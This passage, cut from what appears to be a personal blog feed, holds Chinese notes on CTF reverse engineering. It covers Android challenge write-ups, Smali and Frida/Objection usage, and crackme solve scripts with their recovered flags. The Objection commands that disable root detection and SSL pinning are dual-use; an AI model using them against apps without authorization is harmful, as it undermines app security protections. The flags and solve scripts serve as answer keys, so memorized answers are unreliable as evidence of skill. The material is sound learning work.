class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取数据</span></span><br><span class="line">fLib = <span class="built_in">open</span>(<span class="string">&quot;libnative.so&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">fLib.seek(<span class="number">0x6004</span>, <span class="number">0</span>);</span><br><span class="line">read_buf = fLib.read(<span class="number">0x3CA10</span>)</span><br><span class="line">fDump = <span class="built_in">open</span>(<span class="string">&quot;out.dump&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">fDump.write(read_buf);</span><br><span class="line">fDump.close();</span><br><span class="line">fLib.close();</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./blog/out.dump&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    data_len = <span class="built_in">len</span>(data)</span><br><span class="line">    decode_bytes = [<span class="number">0</span>] * data_len</span><br><span class="line"><span class="comment"># 分组异或</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">        per_seg_len = <span class="built_in">int</span>(<span class="built_in">len</span>(data) // <span class="number">10</span>)</span><br><span class="line">        start = i * per_seg_len</span><br><span class="line">        <span class="keyword">while</span> start &lt; (i + <span class="number">1</span>) * per_seg_len:</span><br><span class="line">            decode_bytes[start] = data[start] ^ (i * <span class="number">10</span> + <span class="number">9</span>)</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line"><span class="comment"># 末端</span></span><br><span class="line">    per_seg_len = <span class="built_in">int</span>(<span class="built_in">len</span>(data) // <span class="number">10</span>)</span><br><span class="line">    start = <span class="number">9</span> * per_seg_len</span><br><span class="line">    <span class="keyword">while</span> start &lt; data_len:</span><br><span class="line">        decode_bytes[start] = data[start] ^ <span class="number">89</span></span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line"><span class="comment"># 解压写文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./blog/decode.dex&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(zlib.decompress(<span class="built_in">bytes</span>(decode_bytes)))</span><br><span class="line">java--&gt;native`，`twofish加密`，`dumpdex</span><br></pre></td></tr></table></figure><h3 id="boomshakalaka-3"><a href="#boomshakalaka-3" class="headerlink" title="boomshakalaka-3"></a>boomshakalaka-3</h3><ul><li>这个题本身不难，但跟鬼打了一样</li><li>一个老版飞机大战游戏，jadx打开发现两个包plane和lib，lib明显是原本的游戏，plane是出题人加的</li><li>核心在于<code>SharedPreferences接口</code>的数据传输，查资料后了解到这玩意会在&#x2F;data&#x2F;data&#x2F;package name&#x2F;shared_prefs目录以xml格式接受数据</li><li>查看Cocos2dxPrefsFile.xml，结合游戏，发现是一个不断追加字符的过程，没在java层找到对应代码，那就去so</li><li>so加载了老半天，发现一个score函数，里面就是不断加字符，然后结合题目要求最高分，所以按分数顺序把字符添上得到终极字符串</li><li>最后根据题目给出的传参提示串<code>YmF6aW5nYWFhYQ==</code>猜测base64，解码得到flag</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">native`,`cocos2d`,``SharedPreferences</span><br></pre></td></tr></table></figure><h3 id="Illusion"><a href="#Illusion" class="headerlink" title="Illusion"></a>Illusion</h3><ul><li>发现关键调用checkflag，同时encflag已知，进入so分析</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">encflag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(MainActivity.<span class="built_in">this</span>.getAssets().open(<span class="string">&quot;Flag&quot;</span>))).readLine();</span><br><span class="line"></span><br><span class="line">CheckFlag(flag, encflag))</span><br></pre></td></tr></table></figure><ul><li>直接搜索checkflag函数，是个假函数，未经调用</li><li>搜索onload函数，找到动态加载的真正checkflag函数进行分析</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_DC8</span><span class="params">(_JNIEnv *a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [sp+28h] [bp-34h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [sp+30h] [bp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [sp+34h] [bp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [sp+38h] [bp-24h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="built_in">j_j_Jstring2CStr</span>(a1, a3);<span class="comment">//input flag</span></span><br><span class="line">  v4 = <span class="built_in">j_strlen</span>(v10);</span><br><span class="line">  v9 = <span class="built_in">j_calloc</span>(<span class="number">1u</span>, v4 + <span class="number">1</span>);</span><br><span class="line">  v8 = <span class="built_in">j_j_Jstring2CStr</span>(a1, a4);<span class="comment">//encflag</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(v10); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_10C0</span>(v10[i] + aLjavaLangStrin_0[i] - <span class="number">64</span>, <span class="number">93</span>);</span><br><span class="line">    v9[i] = v5 + <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">j_strcmp</span>(v9, v8) )</span><br><span class="line">    <span class="keyword">return</span> j__JNIEnv::<span class="built_in">NewStringUTF</span>(a1, <span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> j__JNIEnv::<span class="built_in">NewStringUTF</span>(a1, <span class="string">&quot;Try Again!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分析sub_10C0函数，第一层的if判断必为真，只执行第一个函数，函数目的为<code>a1%a2</code>，思路明了，写脚本</li><li>网友这个脚本还是有东西的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = <span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span></span><br><span class="line">data = <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;&quot;</span></span><br><span class="line">data = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    enc = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> enc_flag]</span><br><span class="line">    flag = [<span class="number">0</span>]*<span class="built_in">len</span>(enc)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag[i] = (enc[i]-<span class="number">32</span>)+<span class="number">64</span>-data[i]</span><br><span class="line">        <span class="keyword">while</span> flag[i] &lt; <span class="number">0x32</span>:</span><br><span class="line">            flag[i] += <span class="number">93</span></span><br><span class="line">        <span class="keyword">while</span> flag[i] &gt; <span class="number">125</span>:</span><br><span class="line">            flag[i] -= <span class="number">93</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># CISCN&#123;GJ5728&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-Create</title>
      <link href="/2023/03/31/Android-Create/"/>
      <url>/2023/03/31/Android-Create/</url>
      
        <content type="html"><![CDATA[<ul><li>Android Development Issues<span id="more"></span></li></ul><HR color="red"></HR><ul><li>安卓开发</li></ul><hr><h3 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>                                    </span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="AndroidManifest-xml常见参数"><a href="#AndroidManifest-xml常见参数" class="headerlink" title="AndroidManifest.xml常见参数"></a>AndroidManifest.xml常见参数</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android:name=&quot;&quot;                 //设置activity所属application</span><br><span class="line">android:exported=&quot;true&quot;         //允许外部组件启动这个Activity</span><br><span class="line">android:debuggable=&quot;true&quot;       //设定apk可调试</span><br></pre></td></tr></table></figure><h3 id="夜神模拟器无法adb识别"><a href="#夜神模拟器无法adb识别" class="headerlink" title="夜神模拟器无法adb识别"></a>夜神模拟器无法adb识别</h3><ul><li>adb版本不一致，CV</li></ul><h3 id="隐藏标题栏失效"><a href="#隐藏标题栏失效" class="headerlink" title="隐藏标题栏失效"></a>隐藏标题栏失效</h3><ul><li>继承的是 Activity</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java:</span><br><span class="line">requestWindowFeature(Window.FEATURE_NO_TITLE);</span><br><span class="line">//写在setContentView()方法的前面</span><br><span class="line"></span><br><span class="line">AndroidManifest.xml:</span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.NoTitleBar&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>继承的是 AppCompatActivity</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java:</span><br><span class="line">getSupportActionBar().hide();</span><br><span class="line">//写在setContentView()方法的后面</span><br><span class="line"></span><br><span class="line">AndroidManifest.xml:</span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.AppCompat.NoActionBar&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Java问题"><a href="#Java问题" class="headerlink" title="Java问题"></a>Java问题</h2><ul><li>trim函数，去掉字符串头尾空白字符</li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-Re</title>
      <link href="/2023/03/31/Android-RE/"/>
      <url>/2023/03/31/Android-RE/</url>
      
        <content type="html"><![CDATA[<ul><li>Smail</li><li>Frida</li><li>Objection<span id="more"></span></li></ul><HR color="red"></HR><h1 id="Smail"><a href="#Smail" class="headerlink" title="Smail"></a>Smail</h1><h3 id="寄存器命名"><a href="#寄存器命名" class="headerlink" title="寄存器命名"></a>寄存器命名</h3><ul><li>均为32位，64位用2个寄存器</li><li>p：p0、p1 函数参数</li><li>v：v0、v1 函数内部变量</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><table><thead><tr><th>数据类型——Smail</th><th>数据类型——Java</th></tr></thead><tbody><tr><td>V</td><td>void</td></tr><tr><td>Z</td><td>boolean</td></tr><tr><td>B</td><td>byte</td></tr><tr><td>S</td><td>string</td></tr><tr><td>C</td><td>char</td></tr><tr><td>I</td><td>int</td></tr><tr><td>J</td><td>long</td></tr><tr><td>F</td><td>float</td></tr><tr><td>D</td><td>double</td></tr></tbody></table><ul><li>数组：[+数据类型 eg：[I &lt;&#x3D;&#x3D;&gt; int[]</li></ul><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><ul><li>.class&lt;访问权限&gt;&lt;关键修饰字&gt;&lt;类名&gt;</li><li>.super&lt;父类名&gt;</li><li>.source&lt;源文件名&gt;</li></ul><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.method&lt;访问权限&gt;&lt;关键修饰字&gt;&lt;方法原型（返回值类型）&gt;</span><br><span class="line">&lt;.locals/.registers&gt;    # 非参数变量数目</span><br><span class="line">[.param]# 声明方法中的参数名</span><br><span class="line">[.line]# 源码中的行号</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><h3 id="常量操作指令"><a href="#常量操作指令" class="headerlink" title="常量操作指令"></a>常量操作指令</h3><ul><li>const</li><li>const-string v1,”re” 将string类型常量re放进寄存器v1</li></ul><h3 id="方法调用指令"><a href="#方法调用指令" class="headerlink" title="方法调用指令"></a>方法调用指令</h3><ul><li>invoke-kind {vA、vB}, method@DDDD</li><li>invoke-(virtual、super、static | 正常函数、父类函数、静态函数) { 传入参数 }，方法名</li></ul><h3 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h3><ul><li>move</li><li>move-result-object v0 将上一步的函数返回值存进v0</li></ul><h3 id="分支判断指令"><a href="#分支判断指令" class="headerlink" title="分支判断指令"></a>分支判断指令</h3><ul><li>if-eq：如果vA等于vB则跳转。Java语法表示为“if(vA &#x3D;&#x3D; vB)”</li><li>if-ne：如果vA不等于vB则跳转。Java语法表示为“if(vA !&#x3D; vB)”</li><li>if-lt：如果vA小于vB则跳转。Java语法表示为“if(vA &lt; vB)”</li><li>if-ge：如果vA大于等于vB则跳转。Java语法表示为“if(vA &gt;&#x3D; vB)”</li><li>if-gt：如果vA大于vB则跳转。Java语法表示为“if(vA &gt; vB)”</li><li>if-le：如果vA小于等于vB则跳转。Java语法表示为“if(vA &lt;&#x3D; vB)”</li><li>if-testz vAA, +BBBB：条件跳转指令。拿vAA寄存器与0比较，如果比较结果满足或值为0时就跳转到BBBB指定的偏移处。偏移量BBBB不能为0。 if-testz类型的指令有以下几条：</li><li>if-eqz：如果vAA为0则跳转。Java语法表示为“if(vAA &#x3D;&#x3D; 0)”</li><li>if-nez：如果vAA不为0则跳转。Java语法表示为“if(vAA !&#x3D; 0)”</li><li>if-ltz：如果vAA小于0则跳转。Java语法表示为“if(vAA &lt; 0)”</li><li>if-gez：如果vAA大于等于0则跳转。Java语法表示为“if(vAA &gt;&#x3D; 0)”</li><li>if-gtz：如果vAA大于0则跳转。Java语法表示为“if(vAA &gt; 0)”</li><li>if-lez：如果vAA小于等于0则跳转。Java语法表示为“if(vAA &lt;&#x3D; 0)”</li></ul><h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><h2 id="frida（hook框架）安装配置及基本使用"><a href="#frida（hook框架）安装配置及基本使用" class="headerlink" title="frida（hook框架）安装配置及基本使用"></a>frida（hook框架）安装配置及基本使用</h2><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><ul><li>pip install frida &gt; 核心</li><li>pip install frida-tools &gt; 工具包</li><li>frida –version &gt; 版本检测</li><li><a href="https://github.com/frida/frida/releases">Releases · frida&#x2F;frida (github.com)</a>安装对应版本的server，如server-android-x86</li><li>将刚才下载的server文件上传到安卓手机中</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul><li><p>在手机中给server文件可执行权限并运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 文件</span><br><span class="line">./文件</span><br></pre></td></tr></table></figure></li><li><p>在cmd中执行命令</p><ul><li>frida-ps -Ua 列出当前正在运行的程序</li><li>frida -U -f 包名 hook对应程序</li></ul></li></ul><h3 id="Objection配置使用"><a href="#Objection配置使用" class="headerlink" title="Objection配置使用"></a>Objection配置使用</h3><ul><li>基于frida框架的一个自动化脚本集成</li><li>安装：pip3 install objection</li></ul><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><ul><li>Objection -g 包名&#x2F;PID explore 注入app进程</li><li>android root disable 绕过root检测</li><li>android proxy set 设置代理</li><li>android sslpinning disable 绕过证书固定</li></ul><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.retest.MainActivity&#x27;</span>)</span><br><span class="line">        <span class="comment">//overload重载</span></span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x, y</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            ...</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h2 id="类函数和实例方法主动调用"><a href="#类函数和实例方法主动调用" class="headerlink" title="类函数和实例方法主动调用"></a>类函数和实例方法主动调用</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.retest.MainActivity&#x27;</span>)</span><br><span class="line">        <span class="comment">//静态函数，直接调用</span></span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="title function_">staticsecret</span>()</span><br><span class="line">        </span><br><span class="line"><span class="comment">//动态函数主动调用</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.example.retest.MainActicity&#x27;</span>,&#123;</span><br><span class="line">            <span class="comment">//实例化对象</span></span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="comment">//调用</span></span><br><span class="line">                instance.<span class="title function_">secret</span>()</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;search Complete&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GFSJ-Re</title>
      <link href="/2023/03/31/GFSJ-Re/"/>
      <url>/2023/03/31/GFSJ-Re/</url>
      
        <content type="html"><![CDATA[<ul><li>GFSJ-Re<span id="more"></span></li></ul><HR color="red"></HR><h3 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h3><ul><li>在初始化函数中隐藏关键代码</li><li>找到关键代码动调就行</li></ul><h3 id="rev300"><a href="#rev300" class="headerlink" title="rev300"></a>rev300</h3><ul><li>水题，恢复switch递归（模拟递归求解序号应该最快）得到a1，然后异或</li></ul><h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><ul><li><p>乱序循环-&gt;异或加密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0x5f</span>,<span class="number">0xf2</span>,<span class="number">0x5e</span>,<span class="number">0x8b</span>,<span class="number">0x4e</span>,<span class="number">0xe</span>,<span class="number">0xa3</span>,<span class="number">0xaa</span>,<span class="number">0xc7</span>,<span class="number">0x93</span>,<span class="number">0x81</span>,<span class="number">0x3d</span>,<span class="number">0x5f</span>,<span class="number">0x74</span>,<span class="number">0xa3</span>,<span class="number">0x9</span>,<span class="number">0x91</span>,<span class="number">0x2b</span>,<span class="number">0x49</span>,<span class="number">0x28</span>,<span class="number">0x93</span>,<span class="number">0x67</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">22</span>; i++)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>  j = <span class="number">0</span>, v24 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(j &lt; i)&#123;</span><br><span class="line">v24 = <span class="number">1828812941</span> * v24 + <span class="number">12345</span>;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt;(<span class="type">char</span>)(v24^a[i<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h3><ul><li>纯水题，pyc反编md5直接解密</li></ul><h3 id="tt3441810"><a href="#tt3441810" class="headerlink" title="tt3441810"></a>tt3441810</h3><ul><li>抽象十六进制数据文件，过滤得到flag</li></ul><h3 id="BABYRE"><a href="#BABYRE" class="headerlink" title="BABYRE"></a>BABYRE</h3><ul><li><p>这个题我觉得不错</p></li><li><p><code>if ( v5 == 14 &amp;&amp; (*(unsigned int (__fastcall **)(char *))judge)(s) )</code></p></li><li><p>这里的judge明显是个函数，但是看反编又是个数组，说明是个花指令，通过前面的执行修改机器码实现函数</p></li><li><p>所以想PatchByte、CP恢复函数，再写脚本如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string  s = <span class="string">&quot;fmcd&quot;</span>;</span><br><span class="line"> <span class="type">int</span> v2 = <span class="number">127</span>;</span><br><span class="line">  string s1 = <span class="string">&quot;k7d;V`;np&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; i++)&#123;</span><br><span class="line">  cout &lt;&lt;(<span class="type">char</span>)(s[i] ^ i);</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt;(<span class="type">char</span>)(v2^<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">5</span>; i &lt;= <span class="number">13</span>; i++)&#123;</span><br><span class="line">  cout &lt;&lt;(<span class="type">char</span>)(s1[i<span class="number">-5</span>] ^ i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><ul><li>一个nspack壳，利用pushad，popad手动脱掉就行，然后就是个简单异或</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string s = <span class="string">&quot;this_is_not_flag&quot;</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0x12</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x14</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0x4a</span>,<span class="number">0x3d</span>,<span class="number">0x56</span>,<span class="number">0x0a</span>,<span class="number">0x10</span>,<span class="number">0x67</span>,<span class="number">0x00</span>,<span 